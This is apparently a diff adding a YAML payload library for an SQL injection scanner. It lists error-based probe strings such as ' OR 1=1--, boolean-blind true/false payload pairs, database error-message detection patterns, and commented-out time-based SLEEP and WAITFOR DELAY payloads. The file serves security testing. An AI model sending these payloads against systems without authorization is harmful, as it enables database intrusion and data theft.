@@ -1,0 +1,44 @@
+version: "1.0"
+description: "SQL injection payload library for error-based and boolean-blind detection"
+
+error_based:
+  payloads:
+    - "'"
+    - '"'
+    - "1'"
+    - "1'--"
+    - "1' OR '1'='1"
+    - "1' OR '1'='1'--"
+    - "' OR '1'='1"
+    - "' OR 1=1--"
+  detection_patterns:
+    - "you have an error in your sql syntax"
+    - "mysql_fetch"
+    - "mysql_num_rows"
+    - "mysql_affected_rows"
+    - "warning: mysql"
+    - "valid mysql result"
+    - "check the manual that corresponds to your"
+    - "mysql server version"
+    - "mariadb server version"
+    - "supplied argument is not a valid mysql"
+    - "sqlstate"
+    - "unclosed quotation mark"
+    - "unterminated string"
+
+boolean_blind:
+  pairs:
+    - true_payload: "1 AND 1=1"
+      false_payload: "1 AND 1=2"
+    - true_payload: "1' AND '1'='1"
+      false_payload: "1' AND '1'='2"
+    - true_payload: "1 AND 1=1--"
+      false_payload: "1 AND 1=2--"
+  diff_threshold: 50
+
+# Future expansion: time_based, out_of_band, etc.
+# time_based:
+#   payloads:
+#     - "1' AND SLEEP(5)--"
+#     - "1; WAITFOR DELAY '0:0:5'--"
+#   delay_threshold: 4.5
